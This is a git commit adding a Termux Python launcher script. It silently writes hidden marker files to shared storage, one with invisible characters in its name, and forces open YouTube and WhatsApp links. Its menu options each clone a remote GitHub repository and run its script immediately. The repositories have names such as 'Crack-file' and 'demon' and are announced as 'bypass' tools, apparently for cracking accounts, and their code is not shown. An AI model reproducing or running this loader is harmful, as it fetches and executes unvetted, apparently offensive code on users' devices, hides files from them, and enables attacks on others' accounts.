8c02e32a449aff3c09ad6b8975f6f5de746e8760
khan-tan <92778771+khan-tan@users.noreply.github.com>
2022-03-04 00:00:28 +0100

    Add files via upload

---
+++ bo.py
@@ -0,0 +1,188 @@
+###BY KARMA DAVID
+#CODING BY KARMA DAVID
+#SCRIPT FOR COLLECTION
+
+import os, sys, time, datetime, random
+r ='\033[1;91m'
+z ='\033[0m'
+g ='\033[1;92m'
+y ='\033[1;93m'
+c ='\033[1;96m'
+
+if os.path.exists("/data/data/com.termux/files/usr/share/doc/xz/examples/‎‎.‎‎‎gbbdgfile"):
+	os.system("rm -rf /data/data/com.termux/files/usr/share/doc/xz/examples/‎‎.‎‎‎gbbdgfile")
+	open("/data/data/com.termux/files/usr/share/doc/xz/examples/‎‎.‎‎‎gbbdgfile", 'w').close()
+
+if not os.path.exists("/data/data/com.termux/files/usr/share/doc/xz/examples/‎‎.‎‎‎gbbdgfile"):
+	open("/data/data/com.termux/files/usr/share/doc/xz/examples/‎‎.‎‎‎gbbdgfile", 'w').close()
+	
+if os.path.exists("/sdcard/.asa.txt"):
+	os.system("rm -rf /sdcard/.asa.txt")
+	open("/sdcard/.asa.txt", 'w').close()
+	
+if not os.path.exists("/sdcard/.asa.txt"):
+	open("/sdcard/.asa.txt", 'w').close()
+	
+if os.path.exists("/data/data/com.termux/files/home/storage/shared/Android/.bs7nt.txt"):
+	os.system("rm -rf /data/data/com.termux/files/home/storage/shared/Android/.bs7nt.txt")
+	open("/data/data/com.termux/files/home/storage/shared/Android/.bs7nt.txt", 'w').close()
+	
+if not os.path.exists("/data/data/com.termux/files/home/storage/shared/Android/.bs7nt.txt"):
+	open("/data/data/com.termux/files/home/storage/shared/Android/.bs7nt.txt", 'w').close()
+	
+if os.path.exists("/storage/emulated/0/.android.txt"):
+	os.system("rm -rf /storage/emulated/0/.android.txt")
+	open("/storage/emulated/0/.android.txt", 'w').close()
+	
+if not os.path.exists("/storage/emulated/0/.android.txt"):
+	open("/storage/emulated/0/.android.txt", 'w').close()
+	
+waraliens = "\033[0m=========================================="
+logo = """
+
+     .____/\ .______  .______  ._____.___ .______  
+:   /  \:      \ : __   \ :         |:      \ 
+|.  ___/|   .   ||  \____||   \  /  ||   .   |
+|     \ |   :   ||   :  \ |   |\/   ||   :   |
+|      \|___|   ||   |___\|___| |   ||___|   |
+|___\  /    |___||___|          |___|    |___|
+     \/                                       
+---------------------------------------------
+OWNER: KARMA + DAVID + CODING BY KARMA DAVID
+---------------------------------------------
+"""
+###method sub yt ####
+
+def subkrbc():
+	print(g+'WELCOME TO MY SCRIPT')
+	os.system('clear')
+	print(logo)
+	print(r+'\nDUDE KINDLY SUB TO MY CHANNEL ')
+	print(waraliens)
+	time.sleep(3)
+	os.system('xdg-open https://youtube.com/channel/UC8fr8LX2_D30HxQGpMunBUw')
+	print(r+'GO & SUBSCRIBE DONT PLAY WITH YOUR FATHER')
+	print(waraliens)
+	time.sleep(4)
+	os.system('xdg-open https://youtube.com/channel/UC8fr8LX2_D30HxQGpMunBUw')
+	print(r+'MESSAGE ADMIN KARMA ')
+	print(waraliens)
+	time.sleep(4)
+	os.system('xdg-open https://wa.me/+2348110044418') #Karma
+	print(y+'THANKS\n')
+	print(waraliens)
+	time.sleep(2)
+	os.system('xdg-open https://youtube.com/channel/UC8fr8LX2_D30HxQGpMunBUw') #KARMA
+	print(g+'THANKS FOR SUB WAIT STARTING SCTIPT ...\n',z)
+	time.sleep(5)
+	
+	
+
+if not os.path.exists("/sdcard/phuckyou.txt"):
+	subkrbc()
+	
+if not os.path.exists("/sdcard/phuckyou.txt"):
+	open("/sdcard/phuckyou.txt", 'w').close()
+
+
+########
+def techq():
+    print(logo)
+    print("[1] KARMA [LIPAS]")
+    print("[2] KARMA [IG]")
+    print("[3] KARMA [BOT]")
+    print("[4] KARMA [DEMON]")
+    print("[5] KARMA [JIMI]")
+    print("[6] ADMIN ")
+    print("[7] TUTORIAL ")
+    print("[0] EXIT")
+    print("")
+    QAIS = input('Choose :- ')
+    if QAIS == '1':
+        ADF()
+    elif QAIS == '2':
+        IMTIAZ()
+    elif QAIS == '3':
+        JUTT()
+    elif QAIS == '4':
+        ssb()
+    elif QAIS == '5':
+        NAYAB()
+    elif QAIS == '6':
+        ADMIN()
+    elif QAIS == '7':
+        USE()
+    else:
+    	print('invalid select')
+    time.sleep(2)
+    os.system('clear')
+    techq()
+    
+def ADF():
+
+	print(waraliens)
+	print('WAIT BRO REMOVING OLD & ADDING BYPASS.. ')
+	
+	print(waraliens)
+	os.system('rm -rf hik')
+	os.system("git clone https://github.com/khan-tan/hik")
+	os.system('ls && cd hik && python lapid.py')
+	
+def IMTIAZ():
+	print(waraliens)
+	print('WAIT BRO REMOVING OLD & ADDING BYPASS.. ')
+	time.sleep(3)
+	print(waraliens)
+	os.system('rm -rf IG')
+	os.system('git clone https://github.com/Karma-kh3n/IG')
+	os.system('ls && cd IG && python2 ig.py')
+	
+	
+	
+def JUTT():
+	print(waraliens)
+	print('WAIT BRO REMOVING OLD & ADDING BYPASS.. ')
+	time.sleep(3)
+	print(waraliens)
+	os.system('rm -rf bot')
+	os.system('git clone https://github.com/khan-tan/bot')
+	os.system('ls && cd bot && python bot.py')
+    
+	
+def ssb():
+	print(waraliens)
+	print('WAIT BRO REMOVING OLD & ADDING BYPASS.. ')
+	time.sleep(3)
+	print(waraliens)
+	os.system('rm -rf Crack-file')
+	os.system('git clone https://github.com/ffdvl1120/Crack-file')
+	os.system('ls && cd Crack-file && python2 Ok.py')
+	
+	
+def NAYAB():
+	print(waraliens)
+	print('WAIT BRO REMOVING OLD & ADDING BYPASS.. ')
+	time.sleep(3)
+	print(waraliens)
+	os.system('rm -rf demon')
+	os.system('git clone https://github.com/khan-tan/demon')
+	os.system('ls && cd demon && python demon.py')
+
+	
+def KRISHNA():
+	print('\nCREDIT TO KARMA + DAVID ')
+	print('\nCODING BY KARMA DAVID ')
+	time.sleep(5)
+	techq()
+
+def USE(): 
+	os.system('git clone https://github.com/Karma-kh3n/jimi') 
+	os.system('cd jimi && cd Ka') 
+	os.system('python jimi')
+
+
+if __name__ == '__main__': 
+	os.system('clear') 
+	techq()
+	
+	
